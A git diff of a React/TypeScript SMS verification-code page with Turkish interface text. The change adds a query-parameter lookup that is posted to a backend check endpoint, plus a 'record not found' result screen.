@@ -13,22 +13,59 @@ import { retryButtonStyle, verifyButtonStyle } from "./style/buttonStyle";
 import { descriptionStyle, pageStyle, titleStyle } from "./style/page";
 import { SonucIkon } from "./style/Icon";
 import { cardStyle } from "./style/card";
+import { useSearchParams } from "react-router-dom";
 
 const CODE_LENGTH = 6;
 const TIMER_SECONDS = 180;
 
 function App() {
   const [gsmNo] = useState("5XX XXX XX XX");
-
   const [code, setCode] = useState<string[]>(Array(CODE_LENGTH).fill(""));
-
   const [remaining, setRemaining] = useState(TIMER_SECONDS);
-
   const [sonuc, setSonuc] = useState<SonucDurumu>(null);
-
   const [gonderiliyor, setGonderiliyor] = useState(false);
-
   const [hataMesaji, setHataMesaji] = useState("");
+
+  const [searchParams] = useSearchParams();
+
+  const getPath = searchParams.get("path");
+
+  useEffect(() => {
+    if (getPath == null) {
+      setSonuc("bulunamadi");
+      return;
+    }
+    sendPath();
+  }, [getPath]);
+
+  const sendPath = async () => {
+    try {
+      const formData = new FormData();
+      formData.append("path", getPath ?? "");
+
+      const response = await fetch(
+        "https://digiturkonay.com.tr:4485/processCheck.php",
+        {
+          method: "POST",
+          body: formData,
+        },
+      );
+
+      const data = await response.text();
+      console.log(data);
+
+      if (data === "2") {
+        setSonuc("basarili");
+      } else if (data === "3") {
+        setSonuc("basarisiz");
+      } else if (data !== "true") {
+        setSonuc("bulunamadi");
+      }
+    } catch (error) {
+      console.log(error);
+      setHataMesaji("Bağlantı hatası, lütfen tekrar deneyin.");
+    }
+  };
 
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
@@ -178,6 +215,17 @@ function App() {
             </Button>
           </Box>
         )}
+
+        {sonuc === "bulunamadi" && (
+          <Box sx={{ py: 3.5 }}>
+            <SonucIkon tip="bulunamadi" />
+            <Typography sx={titleStyle}>Kaydınız Bulunamadı!</Typography>
+            <Typography sx={descriptionStyle}>
+              Kaydınız Bulunamadı. Lütfen daha sonra tekrar deneyin
+            </Typography>
+          </Box>
+        )}
+
         {!sonuc && (
           <>
             <Box
